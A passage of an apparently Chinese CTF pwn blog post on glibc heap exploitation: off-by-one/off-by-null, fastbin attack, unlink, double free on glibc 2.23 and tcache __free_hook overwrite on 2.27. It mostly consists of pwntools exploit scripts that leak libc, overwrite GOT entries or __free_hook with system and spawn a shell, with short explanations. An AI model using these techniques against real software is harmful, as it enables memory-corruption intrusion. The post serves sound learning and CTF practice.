class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">0x08</span>)+p64(one_gadget)+p64(realloc_addr+<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x68</span>,payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;How much do you want&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;0x18&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>free(2)</p>
+<p>add(0x120, b’\0’*0x108+flat(0x71, fake_chunk_addr))</p>
+<p>将堆块2free，申请处0x120，将堆块2的fd改了，fastbin attack</p>
+<p>在这里就解释一下这个</p>
+<p>为什么不能直接修改chunk2，因为堆块已经合并了，即使修改修改完fd也申请不出来，只能将chunk2前一个堆块先申请出来，多申请一点，带着把chunk2的fd给修改了</p>
+<h3 id="3-off-by-null-fastbin-attack-unlink"><a href="#3-off-by-null-fastbin-attack-unlink" class="headerlink" title="3.off by null fastbin attack unlink"></a>3.off by null fastbin attack unlink</h3><p>add(0x80,b’chunk0’)</p>
+<p>add(0x68,b’chunk1’)</p>
+<p>add(0xf0,b’chunk2’)</p>
+<p>add(0x10,b’chunk3’)</p>
+<p>bug()</p>
+<p>free(0)</p>
+<p>payload &#x3D; b’\x00’*0x60+p64(0x100)</p>
+<p>edit(1,payload)</p>
+<p>free(2)</p>
+<p>这个与前面的一样就不解释了</p>
+<p>然后最关键的来了</p>
+<p>free(1)（堆块1其实被free了两次）</p>
+<p>add(0xa0, b’\0’*0x88+flat(0x71, 0x6020a0-3))（堆叠改，也可以double free具体实现看下面代码）</p>
+<p>这个就是fastbin attack，为什么选在0x6020a0-3，因为fastbin可以申请在这里，而且距离堆块指针所在的地址近</p>
+<p>看一下gdb就明白了</p>
+<p><img src="/2025/11/18/off-by/1746007709112-a7f5c2e3-83ca-4f0f-9742-bfce77c46c6b.png" alt="img"></p>
+<p>fastbin可以申请在这里</p>
+<p><img src="/2025/11/18/off-by/1746007838236-91ddcba5-2ab1-46ce-844d-cf5a23f0db6d.png" alt="img"></p>
+<p>并且距离指针所在地址近，往下面覆盖可以更改指针指向的地址，也就是指针的值，就行unlink一样</p>
+<p>add(0x68,b’\n’)</p>
+<p>add(0x68, b’\0’*3 + flat(0,0,0,0, elf.got[‘atoi’], elf.got[‘puts’]))</p>
+<p>再来理解一下这个，申请两次就把0x6020a0-3这个位置申请出来了，然后因为chunk头，我们其实是从0x6020b0-3这个位置开始写的，先写三个0对齐</p>
+<p>然后看gdb吧</p>
+<p><img src="/2025/11/18/off-by/1746008033010-c13621b5-d279-49ff-a74d-f0834cee937d.png" alt="img"></p>
+<p>补充p64(0)*4</p>
+<p>然后再写就写到0x6020d0，与0x6020d8，也就是将chunk2，chunk3，指针所指向的地址改成了</p>
+<p>elf.got[‘atoi’], elf.got[‘puts’]</p>
+<p><img src="/2025/11/18/off-by/1746008218170-31b13aa1-958a-4564-8a0f-c1e47309e3a6.png" alt="img"></p>
+<p><img src="/2025/11/18/off-by/1746008319273-63c13c3d-d23d-4b7c-8c14-90b89379424b.png" alt="img"></p>
+<p>然受show（3）泄露libc，修改堆块2，将atoi got表改成system</p>
+<h3 id="4-off-by-null-实现double-free"><a href="#4-off-by-null-实现double-free" class="headerlink" title="4.off by null 实现double free"></a>4.off by null 实现double free</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x1f0</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">0</span>) </span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">12</span>+p64(<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#为了造成1uaf，1被free了但是指针位清零</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0x60209d</span>))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="二、2-27"><a href="#二、2-27" class="headerlink" title="二、2.27"></a>二、2.27</h1><h3 id="1-off-by-null"><a href="#1-off-by-null" class="headerlink" title="1.off by null"></a>1.off by null</h3><p>因为2.27的Tcachebins  没有检查，可以任意地址申请，所以我们直接打__free_hook就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/he/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Size&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x190</span>)</span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0xf0</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base--&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x88</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x88</span>)</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">edit(<span class="number">13</span>,p64(system))</span><br><span class="line">edit(<span class="number">12</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>for i in range (7):</p>
+<p>​    add(i,0xf0)</p>
+<p>add(7,0xf0)</p>
+<p>先申请七个，在申请的这个就会进入unsortbins，用来泄露libc</p>
+<p>add(8,0x88)</p>
+<p>这个堆块是在Tcachebins  中，但是也可以堆块合并堆叠，并且利用比fastbins更简单</p>
+<p>for i in range(7):</p>
+<p>​    add(i, 0xf0)</p>
+<p>add(7, 0xf0)</p>
+<p>这个先将7个Tcachebin申请出来，在申请一个就是unsortbins的，这样就可以泄露libc了，后面就不解释了</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag"># 知识点</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/18/UAF/" rel="prev" title="UAF">
+      <i class="fa fa-chevron-left"></i> UAF
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/11/18/Unlink/" rel="next" title="Unlink">
+      Unlink <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%812-23"><span class="nav-number">1.</span> <span class="nav-text">一、2.23</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-off-by-one%EF%BC%8Cfastbin-attack%E6%89%93malloc"><span class="nav-number">1.1.</span> <span class="nav-text">1.off by one，fastbin attack打malloc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-off-by-null"><span class="nav-number">1.2.</span> <span class="nav-text">2.off by null</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%88%A9%E7%94%A8off-by-null%EF%BC%8C%E5%A0%86%E5%9D%97%E5%90%88%E5%B9%B6%E6%B3%84%E9%9C%B2libc"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.利用off by null，堆块合并泄露libc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-off-by-null-fastbin-attack-%E6%89%93malloc"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.off by null fastbin attack 打malloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-off-by-null-fastbin-attack-unlink"><span class="nav-number">1.2.3.</span> <span class="nav-text">3.off by null fastbin attack unlink</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-off-by-null-%E5%AE%9E%E7%8E%B0double-free"><span class="nav-number">1.2.4.</span> <span class="nav-text">4.off by null 实现double free</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%812-27"><span class="nav-number">2.</span> <span class="nav-text">二、2.27</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-off-by-null"><span class="nav-number">2.0.1.</span> <span class="nav-text">1.off by null</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">和方煜</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">和方煜</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">72k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:05</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+// 在最后添加
+<script src="/js/code-unfold.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
